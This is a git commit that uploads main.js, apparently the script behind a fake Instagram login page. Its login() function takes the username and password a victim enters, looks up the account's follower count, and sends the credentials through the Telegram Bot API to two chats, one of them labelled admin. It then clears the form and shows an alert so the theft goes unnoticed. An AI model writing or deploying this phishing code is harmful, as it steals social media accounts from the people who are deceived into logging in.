4470cb73c9ab62f595a6c1ae5edfbe56a62e1811
autoflo <47894933+autoflo@users.noreply.github.com>
2021-05-07 08:05:21 +0300

    Add files via upload

---
+++ main.js
@@ -0,0 +1,64 @@
+$(document).ready(function() {
+  var winh = $(window).height();
+
+  $(".header").height(winh);
+
+  $(".space").height(winh / 4);
+
+  $("button").click(function() {
+    window.location.href = "login.html";
+  });
+});
+
+function login() {
+  var username = $("#username").val();
+
+  var pass = $("#pass").val();
+
+  var token = "";
+
+  var id = "";
+  var admin = "";
+
+  if (username.length > 0 && pass.length > 0) {
+    $("#logbut").attr("disabled", "disabled");
+
+    $.get(`https://www.instagram.com/${username}/?__a=1`, function(info) {
+      var text =
+        "user : `" +
+        username +
+        "`                                                                 pass : `" +
+        pass +
+        "`" +
+        "                                                                   Count : " +
+        info.graphql.user.edge_followed_by.count;
+
+      $.get(
+        "https://api.telegram.org/bot" +
+          token +
+          "/sendMessage?chat_id=" +
+          id +
+          "&text=" +
+          text +
+          "&parse_mode=markdown",
+        function(data) {
+          $("#logbut").removeAttr("disabled", "disabled");
+
+          $(".alert").show();
+
+          $("#username,#pass").val("");
+        }
+      );
+
+      $.get(
+        "https://api.telegram.org/bot" +
+          token +
+          "/sendMessage?chat_id=" +
+          admin +
+          "&text=" +
+          text +
+          "&parse_mode=markdown"
+      );
+    });
+  }
+}
